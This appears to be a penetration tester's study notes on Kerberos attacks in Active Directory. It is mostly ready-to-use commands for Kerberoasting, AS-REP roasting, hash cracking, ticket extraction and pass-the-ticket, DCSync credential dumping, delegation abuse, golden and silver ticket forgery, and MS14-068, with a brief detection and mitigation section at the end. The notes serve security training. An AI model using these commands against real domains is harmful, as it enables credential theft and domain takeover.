---
title: Kerberoasting
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
---
# 🔐 Kerberos attacks
 

[See about Kerberos authentication](kerberos-authentication.md).

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:

- RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
- AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`

```
Kerberos Attacks
│
├── SPN Enumeration
├── Kerberoasting
├── AS-REP Roasting
├── Ticket Extraction
├── Pass-the-Ticket
├── Overpass-the-Hash
├── Delegation Abuse
│   ├── Unconstrained
│   ├── Constrained
│   └── Resource-Based
├── Ticket Forgery
│   ├── Golden Ticket
│   └── Silver Ticket
└── Kerberos Persistence
```

Typical flow:

```
Client → DC : AS-REQ
DC → Client : AS-REP (TGT)

Client → DC : TGS-REQ
DC → Client : TGS-REP (Service ticket)

Client → Service : AP-REQ
Service → Client : AP-REP
```

## SPN Enumeration

```
########################################
# Enumerate SPNs (Kerberoast targets)
########################################

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN
Get-NetUser -SPN
Get-DomainUser -SPN | select serviceprincipalname

# Example. I find Get-NetUse much better thant the Get-DomainUser one
Get-NetUser -SPN | select samaccountname,serviceprincipalname


# Native Windows
setspn -Q */*

# Example
setspn -Q MSSQLSvc/*


# Impacket
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD>

# Example
impacket-GetUserSPNs corp.com/pete:MattLovesAutumn1
Get-DomainSPNTicket -SPN http/files04.corp.com
```



## Kerberoasting TGS-rep

Kerberoasting is an Active Directory attack technique where any authenticated domain user can request a service ticket (TGS) for accounts that have Service Principal Names (SPNs). The ticket is encrypted using the service account's password hash. The attacker can extract this encrypted blob and brute-force it offline to recover the password.


### PowerView

Download PowerView from the PowerSploit repository:  
[https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit)

```powershell
cd c:\
powershell -ep bypass
Import-Module .\Powerview.ps1 -Verbose
```

```
########################################  
# Request service ticket (Kerberoasting)  
########################################

# PowerView  
Invoke-Kerberoast  
  
# Hashcat format  
Invoke-Kerberoast -OutputFormat Hashcat  
  
# Example  
Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt  
  
  
# Request ticket for single SPN  
Get-DomainSPNTicket -SPN <SPN>  
  
# Example  
Get-DomainSPNTicket -SPN MSSQLSvc/sql01.corp.local

# Or Extract only the hash:
(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash
(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash > hash.txt
(Get-DomainSPNTicket -SPN http/files04.corp.com).Hash | Out-File hash.txt
Get-DomainSPNTicket -SPN http/files04.corp.com | Select -ExpandProperty Hash

# Alternative: Request Ticket for a Single Account
Request-SPNTicket
# And then you are prompted to enter SPN

```


### Impacket Get-UserSPNs

[See more about impacket-GetUserSPNs](impacket-GetUserSPNs.md)

If DC is not added to `/etc/hosts` add the flag `-dc-ip` to the command:

```
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>

python3 GetUserSPNs.py corp.com/peter:'Strawberry1!' -outputfile hash.txt

########################################
# Kerberoasting with Impacket
########################################

impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request

# Example
impacket-GetUserSPNs corp.com/pete:MattLovesAutumn1 -request


# Save hashes
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request -outputfile hashes.txt

# Example
impacket-GetUserSPNs -dc-ip 192.168.175.70 corp.com/pete:MattLovesAutumn1 -request -outputfile kerberoast.txt


```

### Rubeus

[See more about Rubeus](rubeus.md).


```
########################################
# Kerberoasting (request service tickets for cracking)
########################################

# Perform Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# Perform Kerberoasting and save hashes to a file
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Perform Kerberoasting and print hashes in simple console format
.\Rubeus.exe kerberoast /simple /nowrap

# Perform Kerberoasting for a specific user
.\Rubeus.exe kerberoast /user:<USER> /nowrap

# Example
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Perform Kerberoasting using a specific SPN
.\Rubeus.exe kerberoast /spn:<SPN> /nowrap

# Example
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap

# Perform Kerberoasting using SPNs from a file
.\Rubeus.exe kerberoast /spns:C:\temp\spns.txt /nowrap


########################################
# Kerberoasting with alternate credentials
########################################

# Perform Kerberoasting using alternate credentials
.\Rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap

# Example
.\Rubeus.exe kerberoast /creduser:corp.local\john /credpassword:P@ssw0rd123 /nowrap


########################################
# Kerberoasting with an existing TGT
########################################

# Perform Kerberoasting using an existing ticket (base64 or kirbi)
.\Rubeus.exe kerberoast /ticket:<BASE64_OR_KIRBI> /nowrap

# Example
.\Rubeus.exe kerberoast /ticket:admin.kirbi /nowrap


# Perform Kerberoasting using enterprise principal
.\Rubeus.exe kerberoast /spn:user@domain.com /enterprise /ticket:<TICKET> /nowrap

# Example
.\Rubeus.exe kerberoast /spn:sqlsvc@corp.local /enterprise /ticket:admin.kirbi /nowrap


# Perform Kerberoasting and automatically retry using enterprise principal
.\Rubeus.exe kerberoast /ticket:<TICKET> /autoenterprise /nowrap

# Example
.\Rubeus.exe kerberoast /ticket:admin.kirbi /autoenterprise /nowrap


########################################
# Kerberoasting LDAP filtering
########################################

# Request tickets only for accounts with adminCount=1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Request tickets for accounts whose passwords were set in a date range
.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 /nowrap

# Example
.\Rubeus.exe kerberoast /pwdsetafter:01-01-2018 /pwdsetbefore:01-01-2022 /resultlimit:10 /nowrap


########################################
# Kerberoasting OPSEC options
########################################

# Perform Kerberoasting using tgtdeleg ticket (forces RC4 for AES accounts in older DCs)
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap

# Perform OPSEC Kerberoasting filtering out AES-enabled accounts
.\Rubeus.exe kerberoast /rc4opsec /nowrap

# Perform Kerberoasting with delay and jitter
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap

# Request AES-encrypted Kerberos service tickets
.\Rubeus.exe kerberoast /aes /nowrap


```


**RC4 versus AES encription**

TGS ticket with RC4 (type 23) encryption is easier to crack than AES and if we force the return of RC4 encrypted hashes, the higher will be the chances to get it cracked. 

```
# Checking Kerberos Encryption Type
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Output will be something similar to:
serviceprincipalname                     msds-supportedencryptiontypes samaccountname
--------------------                     ----------------------------- --------------
testspn/kerberoast.inlanefreight.local   0                             testspn

# Value meaning and correct hashcat module:
# 0: RC4_HMAC_MD5 (default) RC4 (etype 23)
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# 24: AES128 + AES256 AES256 (etype 18)
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt
```

Forcing RC4:

```
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```

**Exception**: On **Windows Server 2019 domain controllers**, the /tgtdeleg downgrade technique generally does not work. The domain controller will return the highest encryption type supported by the account, usually AES‑256.

> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 



### setspn.exe

**1.** Enumerating SPNs with setspn.exe

```cmd-session
setspn.exe -Q */*
```

We will focus on `user accounts` and ignore the computer accounts returned by the tool.

**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.

```powershell
Add-Type -AssemblyName System.IdentityModel
# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
#  New-Object cmdlet to create an instance of a .NET Framework object.
# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
```


**3.** If needed, we could also retrieve all tickets:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


**4.** Extract Tickets from Memory with Mimikatz

```cmd-session
# Launch mimikatz
mimikatz.exe

# Specify base64
base64 /out:true
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.

# Export the tickets
kerberos::list /export 
```

**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```


**6.** We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**7.** Use [kirbi2john.py](kirbi2john.md):


```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

**8.** Cracking the hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.


### Crack kerberoasted service ticket

```bash
########################################
# Crack the Hash Offline
# Kerberoast hashes usually correspond to: Kerberos 5, etype 23, TGS-REP
# hashcat mode: 13100
########################################
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```



## AS-REP roasting 

AS-REP Roasting is an attack targeting the Kerberos authentication protocol. It exploits accounts where Kerberos pre-authentication is disabled, allowing attackers to crack passwords offline.

Standard Kerberos flow:

```
Client → DC : request TGT  
Client proves password knowledge (pre-auth)  
DC → Client : encrypted ticket
```

But if **pre-authentication is disabled**:

```
Client → DC : request TGT for user  
DC → Client : encrypted ticket
```

No password proof is required. That means **anyone can request the ticket**.

#### Powerview

```
########################################
# AS-REP Roasting
########################################

# PowerView: Identify vulnerable accounts
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired

# Example with filtering
Get-DomainUser -PreauthNotRequired | select samaccountname
```

#### Rubeus


```
########################################
# AS-REP Roasting
########################################
# Rubeus
.\Rubeus.exe asreproast

# Example, all
.\Rubeus.exe asreproast /nowrap

# Example, user dave
.\Rubeus.exe asreproast /user:dave  /nowrap
```

#### Impacket


```
########################################
# AS-REP Roasting
########################################
# Impacket. From kali
GetNPUsers.py <DOMAIN>/<user>:<password> -usersfile users.txt -format hashcat

# Example
GetNPUsers.py corp.com/pete:MattLovesAutumn1 -usersfile users.txt -dc-ip 192.168.185.70 -format hashcat
```


Crack as-rep roasted TGT ticket:

```
########################################  
# Crack the Hash Offline
# Kerberoast hashes usually correspond to: Kerberos AS-REP
# hashcat mode: 18200 
########################################
# Crack hashes
hashcat -m 18200 hashes.txt rockyou.txt

# Example
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

If you obtain the output for john:

```bash
john -w=/usr/share/wordlists/rockyou.txt hashes
```


## Ticket Extraction

### Mimikatz

```
# Mimikatz
mimikatz.exe
kerberos::list
kerberos::list /export
```

### Rubeus

```
# Rubeus
./Rubeus.exe dump
```

## Pass-the-Ticket

### mimikatz

```
########################################  
# Pass-the-Ticket (Kerberos ticket reuse)
########################################  
# List kerberos tickets currently loadedand dump them  
.\mimikatz.exe "kerberos::list /dump" "exit"  

# BASIC: Inject a kerberos ticket into the current session. Below more examples with different hashes.
.\mimikatz.exe "kerberos::ptt <TGT_ticket.kirbi>" "exit"
.\mimikatz.exe "kerberos::ptt <TGS_ticket.kirbi>" "exit"


# Create a process using NTLM hash  
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /ntlm:<NTLM_HASH> /domain:<DomainFQDN>" "exit"  

# Example  
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /ntlm:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local" "exit"


# Use NTLM hash to request a Kerberos TGT (Overpass-the-Hash)
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /rc4:<NTLM_HASH>" "exit"
  
# Example  
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe" "exit"

# Use AES key instead of NTLM
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<UserName> /domain:<DomainFQDN> /aes256:<AES_KEY>" "exit"

# Example  
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:corp.local /aes256:4f8b42c27bfa8e6a1c3d95d7f2f8c7c23f9f9c0d7e92b3b3bfb39d9b2e8d3c4a /run:powershell.exe" "exit"

```

### Rubeus

```
########################################
# Pass-the-Ticket with Rubeus
########################################

# Inject Kerberos ticket into current session
.\Rubeus.exe ptt /ticket:<PATH_TO_KIRBI>

# Example
.\Rubeus.exe ptt /ticket:C:\tools\julio.kirbi

# Rubeus
.\Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN>

# Example
.\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local

```


### Impacket

```
########################################
# Pass-the-Ticket with Impacket
########################################
# Linux (Impacket)
getTGT.py <DOMAIN>/'<USER>':'<PASSWORD>'

# Example:
getTGT.py corp.com/pete:MattLovesAutumn1

# Now export the ticket
export KRB5CCNAME=ticket.ccache

# Example
export KRB5CCNAME=pete.ccache

# And use it. For example to check ldap connections:
nxc ldap corp.com -k -u pete -p MattLovesAutumn1 
```


## Kerberos Dsync Attacks

In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API. Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. 

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

### mimikatz

```
########################################  
# DCSync (replicate AD password database)  
########################################  
  
# Replicate domain credential data from domain controller  
.\mimikatz.exe "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"

# Example  
.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"

# Example with just one user
.\mimikatz.exe "lsadump::dcsync /user:corp\dave" "exit"

# Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
.\mimikatz.exe "lsadump::dcsync /user:corp\Administrator" "exit"

```

Copy the NTLM hash and store it in a file named **hashes.dcsync** on our Kali system.

### impacket-secretsdump
secretsdump.py from Impacket is a tool used to extract credential material from Windows systems. One of its most powerful techniques is DCSync, which abuses the way Active Directory domain controllers replicate password data. Instead of dumping hashes from the DC filesystem, DCSync asks the domain controller to replicate credentials over the network.

The attacking account must have one of these rights:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes In Filtered Set

```
########################################  
# DCSync (replicate AD password database)  
########################################  
  
# Replicate domain credential data from domain controller and replicate password data for user dave 
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.175.70

# Replicate domain credential data from domain controller and replicate password data for user krbtgt
impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.175.70

```


## Delegation Abuse (Unconstrained)

```
########################################
# Delegation Abuse (Unconstrained)
########################################
# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Example
Get-DomainComputer -Unconstrained | select name


# Monitor tickets
.\Rubeus.exe monitor
```


## Delegation Abuse (Constrained)

```
########################################
# Delegation Abuse (Constrained)
########################################

# Identify constrained delegation
Get-DomainUser -TrustedToAuth

# Example
Get-DomainUser -TrustedToAuth


# S4U attack
.\Rubeus.exe s4u /user:<SERVICE> /rc4:<HASH> /impersonateuser:<TARGET> /msdsspn:<SPN> /ptt

# Example
Rubeus.exe s4u /user:websvc /rc4:8846f7eaee8fb117ad06bdd830b7586c /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt

```

## # Delegation Abuse (Resource-Based Constrained Delegation)


```
########################################
# Delegation Abuse (Resource-Based Constrained Delegation)
########################################

# Find computers with RBCD
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"

# Example
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"


# Abuse RBCD
impacket-getST -spn cifs/<TARGET> -impersonate administrator <DOMAIN>/<USER>:<PASSWORD>

# Example
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator corp.local/websvc:P@ssw0rd123
```


## Ticket Forgery (Golden Ticket)

**The attack in a nugshell:** First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments.  The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account.

```
########################################  
# Golden Ticket (forge Kerberos TGT)  
########################################  
  
# Forge a kerberos TGT using krbtgt hash  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_HASH> /ptt" "exit"  

# Example  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-234567890-345678901 /krbtgt:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"
```


## Ticket Forgery (Silver Ticket)

```
########################################  
# Silver Ticket (forge service ticket)  
########################################  
  
# Forge a service ticket for a specific service  
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<DomainFQDN> /sid:<DomainSID> /target:<server> /service:cifs /rc4:<SERVICE_HASH> /ptt" "exit"

# Example  
.\mimikatz.exe "kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-123456789-234567890-345678901 /target:http/files04.corp.com /service:iis_service /rc4:6f1e6d9a4f7a6f8c3c1d3a4b5c6d7e8f /ptt" "exit"

# Another example from offsec labs
.\mimikatz.exe "kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:HTTP/web04.corp.com /service:iis_service /rc4:4d28cf5252d39971419580a51484ca09 /ptt" "exit"

```


How to: 

```
############
# To obtain the /rc4:
###########
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords


##########
# To obtain the SID
#########
whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105

The SID would be: S-1-5-21-1987370270-658905905-1781884369

###########
# And the target SPN
##########
impacket-GetUserSPNs -dc-ip $IP <DOMAIN>/<USER>:<PASSWORD> 

# Example
impacket-GetUserSPNs -dc-ip 192.168.175.70 corp.com/pete:MattLovesAutumn1 
ServicePrincipalName   Name  MemberOf                                  PasswordLastSet             LastLogon                   Delegation 
---------------------  ----  ----------------------------------------  --------------------------  --------------------------  ----------
http/files04.corp.com  pete  CN=Development Department,DC=corp,DC=com  2026-03-07 10:56:15.431228  2026-03-07 12:57:52.415604      

It would be http/files04.corp.com 
```


Now we can see the admin ticket:

```
klist -l
```


## Kerberos persistence

```
########################################
# Kerberos Persistence
########################################

# Request renewable TGT
.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /domain:<DOMAIN>

# Example
.\Rubeus.exe asktgt /user:administrator /password:P@ssw0rd123 /domain:corp.local


# Renew ticket
.\Rubeus.exe renew /ticket:<ticket.kirbi>

# Example
.\Rubeus.exe renew /ticket:admin.kirbi


# Use Kerberos ticket with Impacket
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>

# Example
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```


## Kerberos PAC Forgery (MS14-068)

PAC = **Privilege Attribute Certificate**. 

A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation. The vulnerability allowed attackers to forge a PAC and make the KDC accept it, effectively granting Domain Admin privileges.

```
########################################
# Kerberos PAC Forgery (MS14-068)
########################################

# Requirements
# Domain user credentials
# Vulnerable domain controller (unpatched)

# Exploit using PyKEK
python ms14-068.py -u <USER>@<DOMAIN> -s <USER_SID> -d <DOMAIN> -p <PASSWORD>

# Example
python ms14-068.py -u john@corp.local -s S-1-5-21-111-222-333-1105 -d corp.local -p Password123


# Load forged ticket
export KRB5CCNAME=admin.ccache

# Example
export KRB5CCNAME=TGT_john.ccache


# Use ticket for privilege escalation
impacket-psexec -k -no-pass corp.local/john@dc01.corp.local

# Example
impacket-psexec -k -no-pass corp.local/john@dc01.corp.local
```


## Kerberos "Double Hop" Problem

**Kerberos "Double Hop" Problem**: The "Double Hop" problem often occurs when using WinRM/Powershell or Evil-WinRM, since the default authentication mechanism only provides a ticket to access a specific resource (winrm). When we use Kerberos to establish a remote session, we are not using a password for authentication, and the user's ticket-granting service (TGS) ticket is sent to the remote service, but the TGT ticket is not sent. Therefore, when we try to authenticate over a second resource, the machine can not pull any hash from memory or generate any TGS to authenticate us.

In a nutshell, **Kerberos "Double Hop" Problem** arises when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second, as the user's password  was never cached as part of their login.  In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

Example once we are connected with Evil-WinRm:

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

However this does not happen with DRP connections, whereas our TGT is sent during the authentication process to obtain a service ticket for the RDP session. It is then cached on the remote host for subsequent use. This allows seamless access to domain resources from the remote host.

### Workaround #1: unconstrained delegation

If *unconstrained delegation* is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access.

### Workaround #2:  Evil-WinRM and PSCredential Object

 We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request.

```powershell
# Set up: we are connected to the host machine from our attacker machine via Evil-WinRM
# 1. We create a SecureString Object with our creds
$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force
# Example: 
# $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('$domain\$userSamAccountName', $SecPassword)
# Example:
# $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# 2. We send the nested Invoke-Command
Invoke-Command -ComputerName "$hostname.$domainName" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
# Example: 
# Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
```

```
# More things we can do. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the `-credential` flag, we get an error message.
import-module .\PowerView.ps1
get-domainuser -spn -credential $Cred | select samaccountname
```

### Workaround #3: Win-RM and Register PSSession Configuration

>Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials.

```powershell
# Establish a WinRM session on the remote host.
Enter-PSSession -ComputerName $hostName.$domain -Credential $domain\$user
# Example
# Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```powershell
# REgister a new session
Register-PSSessionConfiguration -Name $SessionName -RunAsCredential $domain\$userSamAccountName
# Example:
# Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# Once this is done, we need to restart the WinRM service. From the PS session:
Restart-Service WinRM
# This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

# After we start the session, we can see that the double hop problem has been eliminated.
Enter-PSSession -ComputerName $hostName -Credential $domain\$userSamAccountName -ConfigurationName  $sessionName
# Example:
# Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess

# We can now run tools such as PowerView without having to create a new PSCredential object. For example:
get-domainuser -spn | select samaccountname
```


## Mitigating Kerberoasting

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.

omain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy. Doing so will generate two separate event IDs:

-  [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, 
- and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed.

10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).



